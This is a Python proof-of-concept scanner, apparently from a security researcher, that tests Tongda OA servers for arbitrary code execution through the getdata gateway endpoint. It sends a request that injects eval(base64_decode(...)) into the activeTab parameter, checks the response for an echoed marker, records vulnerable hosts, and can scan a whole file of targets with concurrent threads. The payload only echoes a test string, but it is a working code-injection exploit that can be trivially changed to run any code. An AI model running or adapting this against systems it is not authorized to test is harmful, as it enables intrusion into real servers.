import requests
import argparse
import concurrent.futures

def checkVuln(url):

    #url = 'http://60.205.244.135'
    headers = {
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
               }
    try:
        res = requests.get(f"{url}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage",
                           headers=headers,timeout=10,verify=False)
        if res.status_code == 200 and res.text:
            if "vuln_test" in res.text:
                print(f"\033[1;32m[+] {url}存在存在任意代码执行漏洞... " + "\033[0m")
                with open('results.txt', 'a') as f:
                    f.write(f"{url}\n")
                    f.close()
            else:
                print(f"\033[1;31m[-] 该目标不存在此漏洞!" + "\033[0m")
        else:
            print(f"\033[1;31m[-] 该目标不存在此漏洞!" + "\033[0m")
    except Exception:
        print(f"\033[1;31m[-] 连接 {url} 发生了问题!" + "\033[0m")




def banner():
    print("""
 ________  _______                       _______                      
/        |/       \                     /       \                     
$$$$$$$$/ $$$$$$$  |  ______    ______  $$$$$$$  |  _______   ______  
   $$ |   $$ |  $$ | /      \  /      \ $$ |__$$ | /       | /      \ 
   $$ |   $$ |  $$ |/$$$$$$  | $$$$$$  |$$    $$< /$$$$$$$/ /$$$$$$  |
   $$ |   $$ |  $$ |$$ |  $$ | /    $$ |$$$$$$$  |$$ |      $$    $$ |
   $$ |   $$ |__$$ |$$ \__$$ |/$$$$$$$ |$$ |  $$ |$$ \_____ $$$$$$$$/ 
   $$ |   $$    $$/ $$    $$/ $$    $$ |$$ |  $$ |$$       |$$       |
   $$/    $$$$$$$/   $$$$$$/   $$$$$$$/ $$/   $$/  $$$$$$$/  $$$$$$$/ 
                                                          By:Bu0uCat
""")



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个检测通达oaGetdata命令执行检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        checkVuln(args.url)
    elif args.file:
        banner()
        f = open(args.file, 'r')
        targets = f.read().splitlines()
        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(checkVuln, targets)
    else:
        banner()
        print("-u,--url 指定需要检测的URL")
        print("-f,--file 指定需要批量检测的文件")